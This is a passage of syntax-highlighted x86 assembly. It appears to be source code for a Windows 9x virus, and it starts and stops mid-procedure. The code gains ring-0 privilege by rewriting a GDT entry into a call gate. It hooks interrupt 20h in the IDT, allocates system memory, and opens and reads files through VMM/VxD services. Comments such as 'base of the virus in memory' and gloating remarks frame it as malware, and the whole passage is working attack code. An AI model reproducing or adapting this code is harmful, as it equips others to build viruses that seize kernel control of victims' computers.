        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;Y replase de 1 entry coz 0 entry dont works</span><span class="sc0">

        </span><span class="sc1">;;Copy the first selector for use temporally as callback</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Comp.Offset_L</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CallbackCPY</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.Comp.Offset_L</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Comp.Sel</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CallbackCPY</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.Comp.Sel</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Comp.Attrib</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CallbackCPY</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.Comp.Attrib</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Comp.Offset_H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CallbackCPY</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.Comp.Offset_H</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0"> 
             
        </span><span class="sc1">;;Fill the First selector with my callback hahahahaha......hoho...hahaha.. buahahaha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CS0</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Comp.Sel</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Comp.Attrib</span><span class="sc4">,</span><span class="sc2">0ec00h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Comp.Offset_L</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Comp.Offset_H</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc1">;;;;Set the Far Jmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SALTO</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.FARJMP.jmpoffset32</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SALTO</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.FARJMP.sel</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc1">;;Is time to Jump Babe</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">gs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">fs</span><span class="sc0">
    </span><span class="sc6">cli</span><span class="sc0">                
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">FWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SALTO</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Jummmmp yea</span><span class="sc0">
    </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">gs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">CallRing0</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;;All proc in Ring 0 must beguin with this proc</span><span class="sc0">
</span><span class="sc5">InitRing0</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GDT</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.base</span><span class="sc0"> </span><span class="sc1">;get the base and limit in the gdt</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc1">;;Restauro the first selector used temporaly as a callback</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CallbackCPY</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.Comp.Offset_L</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Comp.Offset_L</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CallbackCPY</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.Comp.Sel</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Comp.Sel</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CallbackCPY</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.Comp.Attrib</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Comp.Attrib</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CallbackCPY</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.Comp.Offset_H</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Comp.Offset_H</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">cli</span><span class="sc0">

        </span><span class="sc1">;;get the data segment for my Criature... ;)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc4">[</span><span class="sc5">DS0</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc4">[</span><span class="sc5">ES0</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">gs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc4">[</span><span class="sc5">GS0</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InitRing0</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">;;;DirectHOOKED</span><span class="sc0">

</span><span class="sc1">;;hook the int 20 in ring 0</span><span class="sc0">
</span><span class="sc1">;EBP= delta offset</span><span class="sc0">
</span><span class="sc1">;ECX=offset of nuew int</span><span class="sc0">
</span><span class="sc1">;in vector_irq save the old pointer</span><span class="sc0">
</span><span class="sc5">HOOK_INT20H</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">sidt</span><span class="sc0">    </span><span class="sc10">FWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">IDT</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">IDT_dir</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;;Change the descriptor in the idt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">20H</span><span class="sc4">]</span><span class="sc5">.idt_descriptor.desp_l</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">      
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">20H</span><span class="sc4">]</span><span class="sc5">.idt_descriptor.desp_h</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">20H</span><span class="sc4">]</span><span class="sc5">.idt_descriptor.sel</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">    
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">HOOK_INT20H</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">;EBP= must have delta offset</span><span class="sc0">
</span><span class="sc1">;Return in vector_irq offset of CD20</span><span class="sc0">
</span><span class="sc5">GET_DIR_INT20h</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
      </span><span class="sc6">cli</span><span class="sc0">
      </span><span class="sc6">sidt</span><span class="sc0">      </span><span class="sc10">FWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">IDT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">IDT_dir</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc1">;;Save the Vector to real int 20h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">20H</span><span class="sc4">]</span><span class="sc5">.idt_descriptor.desp_l</span><span class="sc0">     
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">vector_irq</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">20H</span><span class="sc4">]</span><span class="sc5">.idt_descriptor.desp_h</span><span class="sc0">        
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">vector_irq</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">20H</span><span class="sc4">]</span><span class="sc5">.idt_descriptor.sel</span><span class="sc0">    
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">vector_irq</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">sti</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GET_DIR_INT20h</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">;;Miselaneos </span><span class="sc0">

</span><span class="sc1">;Get the delta OFFSET</span><span class="sc0">
</span><span class="sc1">;Return in EBP=DeltaOFFSET</span><span class="sc0">
</span><span class="sc5">DeltaOFFSET</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">SIGUIENTE</span><span class="sc0">
</span><span class="sc5">SIGUIENTE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc10">DWord</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc5">Offset32</span><span class="sc0"> </span><span class="sc5">SIGUIENTE</span><span class="sc0"> </span><span class="sc1">;lo guardamos en bp</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DeltaOFFSET</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">;;; DirectMEM</span><span class="sc0">
</span><span class="sc1">;Alloc memory in the heap of the system</span><span class="sc0">
</span><span class="sc1">;EBX=nbytes for alloc</span><span class="sc0">
</span><span class="sc1">;Retun in EAX the pointer allocated</span><span class="sc0">
</span><span class="sc5">MemAlloc</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc5">PATCH1</span><span class="sc0">  </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">FAR</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">79</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">VMM_ID</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MemAlloc</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;;;DirectFILE</span><span class="sc0">
</span><span class="sc1">;;;ESI==&gt;&gt;&gt; name of the File</span><span class="sc0">
</span><span class="sc1">;;;EAX return the handle of file</span><span class="sc0">
</span><span class="sc1">;;;EBP=Base of the virus in memory</span><span class="sc0">
</span><span class="sc5">OPEN_FILE</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SDF_OCUPADO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d500h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc5">PATCH2</span><span class="sc0">  </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">FAR</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">50</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SDF_OCUPADO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OPEN_FILE</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">;;;ESI==&gt;&gt;&gt; nombre of the File</span><span class="sc0">
</span><span class="sc1">;;;EAX return the handle of file</span><span class="sc0">
</span><span class="sc1">;;;EBP=Base of the virus in memory</span><span class="sc0">
</span><span class="sc5">OPEN_FILE_IN_CONTEXT</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SDF_OCUPADO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d501h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0"> </span><span class="sc1">;;;;;;;provar con 6 o 7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc5">PATCH2b</span><span class="sc0"> </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">FAR</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">50</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SDF_OCUPADO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OPEN_FILE_IN_CONTEXT</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">



</span><span class="sc1">;;EBX==&gt;HANDLE</span><span class="sc0">
</span><span class="sc1">;;ECX==&gt;COUNT</span><span class="sc0">
</span><span class="sc1">;;EDX==&gt;POS</span><span class="sc0">
</span><span class="sc1">;;ESI==&gt;BUFFERS</span><span class="sc0">
</span><span class="sc1">;;EBP=base of the virus in memory</span><span class="sc0">
</span><span class="sc5">READ_FILE</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SDF_OCUPADO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d600h</span><span class="sc0">
